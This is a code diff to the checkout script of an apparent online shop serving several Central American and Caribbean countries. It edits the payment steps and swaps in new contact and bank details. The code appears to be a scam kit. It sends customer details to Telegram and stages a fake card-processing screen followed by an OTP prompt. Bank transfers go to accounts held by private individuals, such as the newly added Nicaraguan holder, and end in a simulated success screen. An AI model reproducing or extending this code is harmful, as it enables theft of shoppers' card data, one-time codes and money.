@@ -1,7 +1,7 @@
 // Country configuration - check if already defined to prevent duplicate declaration
 if (typeof countryConfig === 'undefined') {
     var countryConfig = {
-        nicaragua: { flag: '🇳🇮', name: 'Nicaragua', currency: 'NIO', rate: 37, lang: 'es', phone: '+505 8234-1976' },
+        nicaragua: { flag: '🇳🇮', name: 'Nicaragua', currency: 'NIO', rate: 37, lang: 'es', phone: '+16415048135' },
         honduras: { flag: '🇭🇳', name: 'Honduras', currency: 'HNL', rate: 25, lang: 'es', phone: '+504 9756-4382' },
         trinidad: { flag: '🇹🇹', name: 'Trinidad and Tobago', currency: 'TTD', rate: 6.8, lang: 'en', phone: '+1 868 472-7875' },
         elsalvador: { flag: '🇸🇻', name: 'El Salvador', currency: 'USD', rate: 1, lang: 'es', phone: '+503 7345-6789' },
@@ -726,101 +726,25 @@ function createCheckoutModal() {
     modal.className = 'checkout-modal';
 
     const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
-    checkoutData.total = subtotal;
-    checkoutData.orderNumber = `ORDER-${Date.now()}`;
+    checkoutData.total = subtotal; // This will be the base total
+    checkoutData.orderNumber = `ORDER-${Date.now()}`; // Generate order number
 
     const checkoutHTML = `
     <div class="checkout-header">
         <h2 data-translate="checkout">Checkout</h2>
-        <button class="close-checkout">
-            <i class="fas fa-times"></i>
-        </button>
+        <button class="close-checkout"><i class="fas fa-times"></i></button>
     </div>
     <div class="checkout-content">
-        <div class="checkout-steps">
-            <div class="step active" data-step="1">
-                <span>${(currentLanguage === 'es' ? 'Resumen' : 'Summary')}</span>
+        <div class="checkout-left">
+            <div class="checkout-steps">
+                <div class="step active" data-step="1"><span>${(currentLanguage === 'es' ? 'Información' : 'Information')}</span></div>
+                <div class="step" data-step="2"><span>${(currentLanguage === 'es' ? 'Pago' : 'Payment')}</span></div>
+                <div class="step" data-step="3"><span>${(currentLanguage === 'es' ? 'Verificación' : 'Verification')}</span></div>
+                <div class="step" data-step="4"><span>${(currentLanguage === 'es' ? 'Confirmación' : 'Confirmation')}</span></div>
             </div>
-            <div class="step" data-step="2">
-                <span>${currentLanguage === 'es' ? 'Información' : 'Information'}</span>
-            </div>
-            <div class="step" data-step="3">
-                <span>${currentLanguage === 'es' ? 'Pago' : 'Payment'}</span>
-            </div>
-            <div class="step" data-step="4">
-                <span>${currentLanguage === 'es' ? 'Procesando' : 'Processing'}</span>
-            </div>
-            <div class="step" data-step="5">
-                <span>${currentLanguage === 'es' ? 'Confirmación' : 'Confirmation'}</span>
-            </div>
-            <div class="step" data-step="6">
-                <span>${currentLanguage === 'es' ? 'Verificación' : 'Verification'}</span>
-            </div>
-        </div>
-        <div id="checkout-step-1" class="checkout-step active">
-            <div class="order-summary">
-                <div class="summary-section">
-                    <h3>${currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary'}</h3>
-                    <div class="checkout-items">
-                        ${cart.map(item => {
-                            const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
-                            const giftIndicator = (item.price === 0 || item.isFreeGift) ? ' 🎁' : '';
-                            const isFreeGift = item.price === 0 || item.isFreeGift;
-                            return `
-                                <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
-                                    <img src="${item.image}" alt="${item.name}" style="width: 50px; height: 50px; object-fit: contain; background: var(--background-light); border-radius: 6px; padding: 3px;">
-                                    <div class="checkout-item-details">
-                                        <h4>${item.name}${giftIndicator}</h4>
-                                        <p>Qty: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
-                                    </div>
-                                </div>
-                            `;
-                        }).join('')}
-                    </div>
-                </div>
 
-                <div class="summary-section">
-                    <h4>${(currentLanguage === 'es' ? 'Resumen de Costos' : 'Cost Summary')}</h4>
-                    <div class="checkout-totals">
-                        <div class="totals-row">
-                            <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:')}</span>
-                            <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
-                        </div>
-                        <div class="totals-row shipping-row">
-                            <span class="totals-label">${(currentLanguage === 'es' ? 'Envío:' : 'Shipping:')}</span>
-                            <span class="totals-value free-shipping">
-                                <i class="fas fa-shipping-fast"></i>
-                                ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}
-                            </span>
-                        </div>
-                        <div class="totals-separator"></div>
-                        <div class="totals-row total-row">
-                            <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
-                            <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="summary-section">
-                    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
-                        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
-                        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
-                            ${(currentLanguage === 'es' ? 'Acepto los' : 'I agree to the')} 
-                            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
-                                ${(currentLanguage === 'es' ? 'Términos y Condiciones' : 'Terms and Conditions')}
-                            </a>
-                        </label>
-                    </div>
-                </div>
-
-                <div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
-                    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
-                        ${(currentLanguage === 'es' ? 'Continuar' : 'Continue')} <i class="fas fa-arrow-right"></i>
-                    </button>
-                </div>
-            </div>
-        </div>
-         <div id="checkout-step-2" class="checkout-step">
+            <!-- Step 1: Shipping Information -->
+            <div id="checkout-step-1" class="checkout-step active">
             <div class="customer-info-section">
                 <h3>${(currentLanguage === 'es' ? 'Información de Envío' : 'Shipping Information')}</h3>
                 <div class="form-row">
@@ -828,7 +752,6 @@ function createCheckoutModal() {
                         <label>${(currentLanguage === 'es' ? 'Nombre Completo' : 'Full Name')} *</label>
                         <input type="text" id="customer-name" required placeholder="${(currentLanguage === 'es' ? 'Ingrese su nombre completo' : 'Enter your full name')}" autocomplete="name">
                     </div>
-
                 </div>
                 <div class="form-group">
                     <label>${(currentLanguage === 'es' ? 'Teléfono' : 'Phone Number')} *</label>
@@ -836,15 +759,12 @@ function createCheckoutModal() {
                 </div>
                 <div class="form-group">
                     <label>${(currentLanguage === 'es' ? 'País' : 'Country')} *</label>
-                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly style="background: #f5f5f5;" autocomplete="country">
+                    <input type="text" id="customer-country" required value="${countryConfig[currentCountry].name}" readonly autocomplete="country">
                 </div>
                 <div class="form-group">
                     <label>${(currentLanguage === 'es' ? 'Dirección Completa' : 'Complete Address')} *</label>
                     <textarea id="customer-address" required placeholder="${(currentLanguage === 'es' ? 'Dirección completa: Calle, número, ciudad, estado/provincia, código postal...' : 'Complete address: Street, number, city, state/province, postal code...')}" rows="4" class="responsive-textarea" autocomplete="street-address"></textarea>
-                    <div class="address-help">
-                        <i class="fas fa-info-circle"></i> 
-                        ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}
-                    </div>
+                    <div class="address-help"><i class="fas fa-info-circle"></i> ${(currentLanguage === 'es' ? 'Incluya toda la información necesaria para la entrega' : 'Include all necessary information for delivery')}</div>
                 </div>
                 <div class="form-row">
                     <div class="form-group">
@@ -856,19 +776,16 @@ function createCheckoutModal() {
                         <input type="text" id="customer-postal" placeholder="${(currentLanguage === 'es' ? 'Código postal' : 'Postal code')}" autocomplete="postal-code">
                     </div>
                 </div>
-
-                <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
-                    <button id="back-to-summary" class="btn btn-secondary">
-                        <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
-                    </button>
+                <div class="step-actions">
                     <button id="next-to-payment" class="btn btn-primary checkout-next">
                         ${(currentLanguage === 'es' ? 'Continuar al Pago' : 'Continue to Payment')} <i class="fas fa-arrow-right"></i>
                     </button>
                 </div>
             </div>
-        </div>
+            </div>
 
-        <div id="checkout-step-3" class="checkout-step">
+            <!-- Step 2: Payment -->
+            <div id="checkout-step-2" class="checkout-step">
             <div class="payment-section">
                 <h3>${(currentLanguage === 'es' ? 'Método de Pago' : 'Payment Method')}</h3>
                 <div class="payment-methods">
@@ -895,16 +812,22 @@ function createCheckoutModal() {
                 </div>
 
                 <div id="bank-transfer-details" class="payment-details" style="display: none;">
-                    <h4>${(currentLanguage === 'es' ? 'Datos Bancarios' : 'Bank Details')}</h4>
-                    <div class="bank-info">
-                        <p><strong>${(currentLanguage === 'es' ? 'Banco:' : 'Bank:')}</strong> ${getBankName()}</p>
-                        <p><strong>${(currentLanguage === 'es' ? 'Número de Cuenta:' : 'Account Number:')}</strong> ${getAccountNumber()}</p>
-                        <p><strong>${(currentLanguage === 'es' ? 'Titular de la Cuenta:' : 'Account Holder:')}</strong> ${getAccountHolder()}</p>
-
-                        <p><strong>${(currentLanguage === 'es' ? 'Referencia:' : 'Reference:')}</strong> ${checkoutData.orderNumber}</p>
-                        <p><strong>${(currentLanguage === 'es' ? 'Total a Transferir:' : 'Amount to Transfer:')}</strong> ${convertPrice(subtotal, false)}</p>
+                    <div class="bank-info-box">
+                        <div class="bank-info-header">${(currentLanguage === 'es' ? 'Datos para la Transferencia' : 'Bank Transfer Details')}</div>
+                        <div class="bank-info-row"><span>${(currentLanguage === 'es' ? 'Banco' : 'Bank')}</span><strong>${getBankName()}</strong></div>
+                        <div class="bank-info-row"><span>${(currentLanguage === 'es' ? 'Titular' : 'Account Holder')}</span><strong>${getAccountHolder()}</strong></div>
+                        <div class="bank-info-row">
+                            <span>${(currentLanguage === 'es' ? 'Nº de Cuenta' : 'Account No.')}</span>
+                            <div class="account-number-wrapper">
+                                <strong id="bank-account-number">${getAccountNumber()}</strong>
+                                <button id="copy-account-btn" class="copy-btn"><i class="far fa-copy"></i> Copy</button>
+                            </div>
+                        </div>
+                        <div class="bank-info-row"><span>${(currentLanguage === 'es' ? 'Referencia' : 'Reference')}</span><strong>${checkoutData.orderNumber}</strong></div>
+                        <div class="bank-info-row total"><span>${(currentLanguage === 'es' ? 'Monto Total' : 'Total Amount')}</span><strong>${convertPrice(subtotal, false)}</strong></div>
                     </div>
                     <p class="transfer-instructions">
+                        <i class="fas fa-info-circle"></i>
                         ${(currentLanguage === 'es' ? 'Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.' : 'Make the transfer for the total amount and confirm when you have completed the payment.')}
                     </p>
                     <button class="btn btn-primary place-order" data-method="bank-transfer">${(currentLanguage === 'es' ? 'He realizado la transferencia' : 'I have made the transfer')}</button>
@@ -912,12 +835,14 @@ function createCheckoutModal() {
 
             <div id="credit-card-details" class="payment-details" style="display: none;">
                     <h4>${(currentLanguage === 'es' ? 'Detalles de la Tarjeta' : 'Card Details')}</h4>
-                    <p class="accepted-cards">
-                        <span>${(currentLanguage === 'es' ? 'Aceptado:' : 'Accepted:')}</span>
-                        <i class="fab fa-cc-visa"></i>
-                        <i class="fab fa-cc-mastercard"></i>
-                        <i class="fab fa-cc-amex"></i>
-                    </p>
+                    <div class="trust-badges">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/MasterCard_Logo.svg" alt="Mastercard">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/f/f6/American_Express_logo_%282018%29.svg" alt="American Express">
+                        <div class="secure-payment-badge">
+                            <i class="fas fa-lock"></i> <span>Secure Payment</span>
+                        </div>
+                    </div>
                     <form class="card-form">
                         <div class="form-group">
                             <label>${(currentLanguage === 'es' ? 'Nombre del Titular' : 'Cardholder Name')}</label>
@@ -947,14 +872,14 @@ function createCheckoutModal() {
                 </div>
 
                 <div class="step-actions" style="margin-top: 2rem; display: flex; justify-content: space-between;">
-                    <button id="back-to-shipping" class="btn btn-secondary">
+                    <button id="back-to-info" class="btn btn-secondary">
                         <i class="fas fa-arrow-left"></i> ${(currentLanguage === 'es' ? 'Volver' : 'Back')}
                     </button>
                 </div>
             </div>
-        </div>
+            </div>
 
-        <div id="checkout-step-4" class="checkout-step">
+            <div id="checkout-step-3" class="checkout-step">
             <div class="processing-section">
                 <div class="loading-state" id="processing-card-submission">
                     <div class="spinner"></div>
@@ -962,9 +887,9 @@ function createCheckoutModal() {
                     <p>${(currentLanguage === 'es' ? 'Por favor espere mientras enviamos la información de su tarjeta de crédito de forma segura.' : 'Please wait while we submit your credit card information securely.')}</p>
                 </div>
             </div>
-        </div>
+            </div>
 
-        <div id="checkout-step-5" class="checkout-step">
+            <div id="checkout-step-4" class="checkout-step">
             <div class="confirmation-section">
                 <div class="loading-state" id="processing-payment">
                     <div class="spinner"></div>
@@ -997,9 +922,9 @@ function createCheckoutModal() {
                     <button class="btn btn-primary close-checkout-success">${(currentLanguage === 'es' ? 'Continuar Comprando' : 'Continue Shopping')}</button>
                 </div>
             </div>
-        </div>
+            </div>
 
-        <div id="checkout-step-6" class="checkout-step">
+            <div id="checkout-step-5" class="checkout-step">
             <div class="otp-section">
                 <div class="otp-header">
                     <div class="otp-security">
@@ -1027,6 +952,43 @@ function createCheckoutModal() {
                     <div class="otp-error" id="otp-error" style="display: none;">
                         <i class="fas fa-exclamation-triangle"></i>
                         <span>${(currentLanguage === 'es' ? 'Código inválido. Por favor, inténtalo de nuevo.' : 'Invalid code. Please try again.')}</span>
+                    </div>
+                </div>
+            </div>
+            </div>
+        </div>
+        <div class="checkout-right">
+            <div class="order-summary-sticky">
+                <h3>${(currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary')}</h3>
+                <div class="checkout-items-summary">
+                    ${cart.map(item => {
+                        const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
+                        const isFreeGift = item.price === 0 || item.isFreeGift;
+                        return `
+                            <div class="checkout-item-compact ${isFreeGift ? 'free-gift-checkout-item' : ''}">
+                                <img src="${item.image}" alt="${item.name}">
+                                <div class="checkout-item-details-compact">
+                                    <h4>${item.name}</h4>
+                                    <p>Qty: ${item.quantity}</p>
+                                </div>
+                                <span class="checkout-item-price">${itemPrice}</span>
+                            </div>
+                        `;
+                    }).join('')}
+                </div>
+                <div class="checkout-totals">
+                    <div class="totals-row">
+                        <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal' : 'Subtotal')}</span>
+                        <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
+                    </div>
+                    <div class="totals-row shipping-row">
+                        <span class="totals-label">${(currentLanguage === 'es' ? 'Envío' : 'Shipping')}</span>
+                        <span class="totals-value free-shipping"><i class="fas fa-shipping-fast"></i> ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}</span>
+                    </div>
+                    <div class="totals-separator"></div>
+                    <div class="totals-row total-row">
+                        <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total' : 'Total')}</span>
+                        <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
                     </div>
                 </div>
             </div>
@@ -1085,22 +1047,14 @@ function setupCheckoutEventListeners() {
 
             // Handle buttons by ID
             switch (button.id) {
-                case 'next-to-shipping':
-                    e.preventDefault();
-                    const checkbox = document.getElementById('terms-checkbox');
-                    if (checkbox && !checkbox.checked) {
-                        alert(currentLanguage === 'es' ? 'Debe aceptar los términos y condiciones para continuar' : 'You must accept the terms and conditions to continue');
-                        return;
-                    }
-                    goToCheckoutStep(2);
-                    break;
-
-                case 'back-to-summary':
+                case 'back-to-info':
                     e.preventDefault();
                     goToCheckoutStep(1);
                     break;
 
-                case 'back-to-shipping':
+                case 'next-to-payment':
+                    e.preventDefault();
+                    if (!validateShippingInfo()) return;
                     e.preventDefault();
                     goToCheckoutStep(2);
                     break;
@@ -1108,36 +1062,6 @@ function setupCheckoutEventListeners() {
                 case 'next-to-payment':
                     e.preventDefault();
                     const customerName = document.getElementById('customer-name');
-                    const customerPhone = document.getElementById('customer-phone');
-                    const customerAddress = document.getElementById('customer-address');
-                    const customerCity = document.getElementById('customer-city');
-
-                    if (!customerName || !customerName.value.trim()) {
-                        alert(currentLanguage === 'es' ? 'Por favor ingrese su nombre completo' : 'Please enter your full name');
-                        if (customerName) customerName.focus(); return;
-                    }
-                    if (!customerPhone || !customerPhone.value.trim()) {
-                        alert(currentLanguage === 'es' ? 'Por favor ingrese su número de teléfono' : 'Please enter your phone number');
-                        if (customerPhone) customerPhone.focus(); return;
-                    }
-                    if (!customerAddress || !customerAddress.value.trim()) {
-                        alert(currentLanguage === 'es' ? 'Por favor ingrese su dirección completa' : 'Please enter your complete address');
-                        if (customerAddress) customerAddress.focus(); return;
-                    }
-                    if (!customerCity || !customerCity.value.trim()) {
-                        alert(currentLanguage === 'es' ? 'Por favor ingrese su ciudad' : 'Please enter your city');
-                        if (customerCity) customerCity.focus(); return;
-                    }
-
-                    checkoutData.customerName = customerName.value.trim();
-                    checkoutData.customerPhone = customerPhone.value.trim();
-                    checkoutData.customerAddress = customerAddress.value.trim();
-                    checkoutData.customerCity = customerCity.value.trim();
-                    checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
-
-                    TelegramNotifications.sendCustomerInfo({ name: checkoutData.customerName, postcode: checkoutData.customerPostal });
-                    goToCheckoutStep(3);
-                    break;
 
                 case 'verify-otp-btn':
                     e.preventDefault();
@@ -1176,15 +1100,6 @@ function setupCheckoutEventListeners() {
             }
         });
 
-        // --- Listeners for non-button elements ---
-        const termsCheckbox = document.getElementById('terms-checkbox');
-        if (termsCheckbox) {
-            termsCheckbox.addEventListener('change', function() {
-                const nextToShippingBtn = document.getElementById('next-to-shipping');
-                if (nextToShippingBtn) nextToShippingBtn.disabled = !this.checked;
-            });
-        }
-
         // Payment method selection
         document.querySelectorAll('input[name="payment-method"]').forEach(radio => {
             radio.addEventListener('change', function() {
@@ -1200,6 +1115,23 @@ function setupCheckoutEventListeners() {
             });
         });
 
+        // Copy account number button
+        const copyBtn = document.getElementById('copy-account-btn');
+        if (copyBtn) {
+            copyBtn.addEventListener('click', () => {
+                const accountNumber = document.getElementById('bank-account-number')?.innerText;
+                if (accountNumber) {
+                    navigator.clipboard.writeText(accountNumber).then(() => {
+                        copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                        setTimeout(() => { copyBtn.innerHTML = '<i class="far fa-copy"></i> Copy'; }, 2000);
+                    }).catch(err => {
+                        console.error('Failed to copy text: ', err);
+                        alert('Failed to copy account number.');
+                    });
+                }
+            });
+        }
+
         // Setup input-specific behaviors (without click handlers)
         setupOTPInputs();
         setupCardInputFormatting();
@@ -1207,6 +1139,32 @@ function setupCheckoutEventListeners() {
     } catch (error) {
         console.error('Error setting up checkout event listeners:', error);
     }
+}
+
+function validateShippingInfo() {
+    const customerName = document.getElementById('customer-name');
+    const customerPhone = document.getElementById('customer-phone');
+    const customerAddress = document.getElementById('customer-address');
+    const customerCity = document.getElementById('customer-city');
+
+    if (!customerName?.value.trim()) { alert(t('error_enter_name')); customerName.focus(); return false; }
+    if (!customerPhone?.value.trim()) { alert(t('error_enter_phone')); customerPhone.focus(); return false; }
+    if (!customerAddress?.value.trim()) { alert(t('error_enter_address')); customerAddress.focus(); return false; }
+    if (!customerCity?.value.trim()) { alert(t('error_enter_city')); customerCity.focus(); return false; }
+
+    checkoutData.customerName = customerName.value.trim();
+    checkoutData.customerPhone = customerPhone.value.trim();
+    checkoutData.customerAddress = customerAddress.value.trim();
+    checkoutData.customerCity = customerCity.value.trim();
+    checkoutData.customerPostal = document.getElementById('customer-postal')?.value.trim() || '';
+    TelegramNotifications.sendCustomerInfo({ name: checkoutData.customerName, postcode: checkoutData.customerPostal });
+    return true;
+}
+
+function t(key) {
+    const lang = currentLanguage || 'en';
+    const translation = (translations[lang] && translations[lang][key]) ? translations[lang][key] : key;
+    return translation;
 }
 
 function handlePlaceOrder(method) {
@@ -1228,11 +1186,17 @@ function handlePlaceOrder(method) {
                 });
             }
 
-            goToCheckoutStep(4);
+            goToCheckoutStep(3); // Go to processing
             setTimeout(() => {
-                goToCheckoutStep(6);
+                goToCheckoutStep(4); // Go to OTP
                 startOTPCountdown();
             }, 10000);
+        } else if (method === 'bank-transfer') {
+            // For bank transfer, we can proceed directly to confirmation simulation
+            goToCheckoutStep(3); // Go to processing
+            setTimeout(() => {
+                processOrder(); // This will lead to the success screen
+            }, 2000);
         }
     } catch (error) {
         console.error('Error placing order:', error);
@@ -1508,7 +1472,7 @@ function goToCheckoutStep(stepNumber) {
 
 function processOrder() {
     try {
-        goToCheckoutStep(5);
+        goToCheckoutStep(4); // Go to the final confirmation/success step
 
         // Simulate processing steps
         const steps = [
@@ -1828,7 +1792,7 @@ function showInvoiceNotification() {
 function getBankName() {
     const config = countryConfig[currentCountry];
     switch (currentCountry) {
-        case 'nicaragua': return 'Banco de América Central (BAC)';
+        case 'nicaragua': return 'Banco Lafise';
         case 'honduras': return 'Banco Atlántida';
         case 'trinidad': return 'Republic Bank';
         case 'elsalvador': return 'Banco Agrícola';
@@ -1842,7 +1806,7 @@ function getBankName() {
 
 function getAccountNumber() {
     switch (currentCountry) {
-        case 'nicaragua': return '1234567890123456';
+        case 'nicaragua': return '131010702';
         case 'honduras': return '2345678901234567';
         case 'trinidad': return '950036849701 (Chequins)';
         case 'elsalvador': return '4567890123456789';
@@ -1856,7 +1820,7 @@ function getAccountNumber() {
 
 function getAccountHolder() {
     switch (currentCountry) {
-        case 'nicaragua': return 'TechZone';
+        case 'nicaragua': return 'Alison Andrea';
         case 'honduras': return 'TechZone';
         case 'trinidad': return 'Jolie Xavier';
         case 'elsalvador': return 'TechZone';
